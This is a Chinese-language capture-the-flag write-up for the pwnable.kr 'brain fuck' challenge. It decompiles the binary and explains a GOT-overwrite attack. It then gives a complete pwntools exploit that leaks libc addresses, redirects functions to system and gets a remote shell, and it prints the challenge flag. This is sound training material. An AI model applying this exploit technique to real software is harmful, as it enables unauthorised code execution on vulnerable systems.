---
title: pwnable.kr-brain fuck
date: 2018-02-25 10:58:05
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
这道题就有点pwn的意思了嘛
# 分析
题目只给了一个可执行文件`bf`和一个动态链接文件`bf_libc.so`，看来只有逆向它了。使用ida反编译一下`bf`逆向它的逻辑
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // edx@4
  size_t i; // [sp+28h] [bp-40Ch]@1
  int v6; // [sp+2Ch] [bp-408h]@1
  int v7; // [sp+42Ch] [bp-8h]@1

  v7 = *MK_FP(__GS__, 20);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(&v6, 0, 0x400u);
  fgets((char *)&v6, 1024, stdin);
  for ( i = 0; i < strlen((const char *)&v6); ++i )
    do_brainfuck(*((_BYTE *)&v6 + i));
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}
```
这是`main`函数，逻辑简单，主要是对输入字符串的每个字符调用`do_brainfuck`函数处理。
```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax@1
  _BYTE *v2; // ebx@7

  result = a1;
  switch ( a1 )
  {
    case 62:                                    // >
      result = p++ + 1;
      break;
    case 60:                                    // <
      result = p-- - 1;
      break;
    case 43:                                    // +
      result = p;
      ++*(_BYTE *)p;
      break;
    case 45:                                    // -
      result = p;
      --*(_BYTE *)p;
      break;
    case 46:                                    // .
      result = putchar(*(_BYTE *)p);
      break;
    case 44:                                    // ,
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case 91:                                    // [
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```
`do_brainfuck`函数对传入的字符进行`switch`选择，显然这里可以对`p`地址的内容进行操作，可以改变地址值可以往地址里读写内容。那么`p`是啥东西呢？查看反汇编可以发现，`p`存储的地址就在`.bss`段，它的上面就是`got`表。所以思路就是通过`do_brainfuck`函数改写`got`表，获得shell。使用`checksec`发现程序的保护情况如下，可以通过改写`got`表获得shell。
```bash
root@1:~/桌面/test$ checksec bf
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
root@1:~/桌面/test$ checksec bf_libc.so 
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/bf_libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
具体思路是：

 1. 获得`fgets`函数的地址
 2. 根据libc中各函数的相对偏移计算`system,gets`函数的地址
 3. 将`got`表中`memset`覆盖为`gets`，`fgets`覆盖为`system`，`putchar`覆盖为`main`
 4. 通过覆盖后的`gets`函数输入`/bin/sh`

这样当再次执行回`main`函数时即可getshell。具体exp如下
```python
# coding:utf-8
from pwn import *

def work(DEBUG):
    context(arch='i386',os='linux',log_level='info')    
    if DEBUG:
        r = process('./bf')
        libc = ELF('/lib/i386-linux-gnu/libc.so.6') #本地libc(使用ldd查看)
        elf = r.elf
    else:
        r = remote('pwnable.kr',9001)
        libc = ELF('./bf_libc.so')
        elf = ELF('./bf')
        
    p_addr      = 0x0804a0a0
    main_addr   = 0x08048671
    
    #bf got addr
    fgets_got   = elf.got['fgets']
    memset_got  = elf.got['memset']
    putchar_got = elf.got['putchar']
    
    #bf_libc.so function offset with 'fgets'
    gets_offset = libc.symbols['gets']-libc.symbols['fgets']
    system_offset = libc.symbols['system']-libc.symbols['fgets']
    
    r.recvuntil(']\n')
    payload = '<'*(p_addr-fgets_got)+'.>'*4 #get fgets_addr
    payload += '<'*4+',>'*4 #set system_addr to fgets_got
    payload += '>'*(memset_got-fgets_got-4)+',>'*4 #set gets_addr to memset_got 
    payload += '>'*(putchar_got-memset_got-4)+',>'*4 #set main_addr to putchar_got
    payload += '.' #call putchar to call main
    
    r.sendline(payload)
    fgets_addr  = ''
    for i in xrange(4):
        fgets_addr += r.recv(1)
    fgets_addr = u32(fgets_addr)
    gets_addr   = fgets_addr+gets_offset
    system_addr = fgets_addr+system_offset
    
    r.sendline(p32(system_addr)+p32(gets_addr)+p32(main_addr)+'/bin/sh')
    r.interactive()
    
work(False)
```
```bash
[*] Switching to interactive mode
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
$ ls
brainfuck
flag
libc-2.23.so
log
super.pl
$ cat flag
BrainFuck? what a weird language..
$  

```
# 总结
题目很基础，加深了对基础的理解。